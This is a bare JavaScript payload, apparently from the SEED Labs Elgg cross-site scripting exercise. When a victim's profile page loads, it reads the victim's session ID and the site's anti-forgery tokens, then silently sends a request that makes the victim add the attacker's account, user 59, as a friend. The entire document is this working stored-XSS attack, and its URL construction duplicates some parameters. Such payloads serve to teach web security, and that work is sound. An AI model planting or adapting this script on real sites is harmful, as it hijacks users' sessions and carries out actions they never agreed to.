
<script type="text/javascript">
    window.onload = function(){
        var Ajax = null;
        var ts = "&__elgg_ts=" + elgg.security.token.__elgg_ts;
        var token="&__elgg_token=" + elgg.security.token.__elgg_token;
        let sammy_id = 59;
        let victim_id = elgg.session.user.guid;

        var sendurl = "http://www.seed-server.com/action/friends/add?friend=" + sammy_id +
                     "&__elgg_ts="+ts+
                     "&__elgg_token="+token+
                     "&__elgg_ts="+ts+
                     "&__elgg_token="+token;

        if(victim_id != sammy_id){
            Ajax = new XMLHttpRequest();
            Ajax.open("GET", sendurl, true);
            Ajax.setRequestHeader("Host","www.seed-server.com");
            Ajax.setRequestHeader("Content-Type","application/x-www-form-urlencoded");
            Ajax.send();
        }
    }
</script>